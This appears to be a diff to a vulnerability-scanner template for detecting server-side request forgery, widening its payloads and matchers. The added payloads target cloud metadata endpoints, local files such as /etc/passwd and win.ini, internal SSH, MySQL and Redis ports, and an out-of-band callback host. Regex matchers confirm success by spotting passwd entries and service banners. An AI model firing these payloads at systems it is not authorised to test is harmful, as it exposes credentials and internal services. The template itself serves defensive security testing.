@@ -2,11 +2,11 @@ id: response-ssrf
 
 info:
   name: Full Response SSRF Detection
-  author: high
-  severity: medium
+  author: pdteam,pwnhxl
+  severity: high
   reference:
     - https://github.com/bugcrowd/HUNT/blob/master/ZAP/scripts/passive/SSRF.py
-  tags: redirect,dast
+  tags: ssrf,dast
 
 requests:
   - method: GET
@@ -15,7 +15,16 @@ requests:
 
     payloads:
       ssrf:
-        - "{{interactsh-url}}"
+        - 'http://{{interactsh-url}}'
+        - 'file:////./etc/./passwd'
+        - 'file:///c:/./windows/./win.ini'
+        - 'http://metadata.tencentyun.com/latest/meta-data/'
+        - 'http://100.100.100.200/latest/meta-data/'
+        - 'http://169.254.169.254/latest/meta-data/'
+        - 'http://169.254.169.254/metadata/v1'
+        - 'http://127.0.0.1:22'
+        - 'http://127.0.0.1:3306'
+        - 'dict://127.0.0.1:6379/info'
 
     fuzzing:
       - part: query
@@ -28,8 +37,10 @@ requests:
           - dir
           - domain
           - feed
+          - file
           - host
           - html
+          - imgurl
           - navigation
           - next
           - open
@@ -50,24 +61,65 @@ requests:
           - view
           - window
         fuzz:
-          - "https://{{ssrf}}"
+          - "{{ssrf}}"
 
       - part: query
         mode: single
         values:
-          - "https?://" # Replace HTTP URLs with alternatives
+          - "(https|http|file)(%3A%2F%2F|://)(.*?)"
         fuzz:
-          - "https://{{redirect}}"
+          - "{{ssrf}}"
 
     stop-at-first-match: true
-    matchers-condition: and
+    matchers-condition: or
     matchers:
-      - type: word
-        part: interactsh_protocol  # Confirms the HTTP Interaction
-        words:
-          - "http"
 
       - type: word
         part: body
         words:
           - "Interactsh Server"
+
+      - type: regex
+        part: body
+        regex:
+          - 'SSH-(\d.\d)-OpenSSH_(\d.\d)'
+
+      - type: regex
+        part: body
+        regex:
+          - '(DENIED Redis|CONFIG REWRITE|NOAUTH Authentication)'
+
+      - type: regex
+        part: body
+        regex:
+          - '(\d.\d.\d)(.*?)mysql_native_password'
+
+      - type: regex
+        part: body
+        regex:
+          - 'root:.*?:[0-9]*:[0-9]*:'
+
+      - type: word
+        part: body
+        words:
+          - 'for 16-bit app support'
+
+      - type: regex
+        part: body
+        regex:
+          - 'dns-conf/(.*?)instance/'
+
+      - type: regex
+        part: body
+        regex:
+          - 'app-id(.*?)placement/'
+
+      - type: regex
+        part: body
+        regex:
+          - 'ami-id(.*?)placement/'
+
+      - type: regex
+        part: body
+        regex:
+          - 'id(.*?)interfaces/'
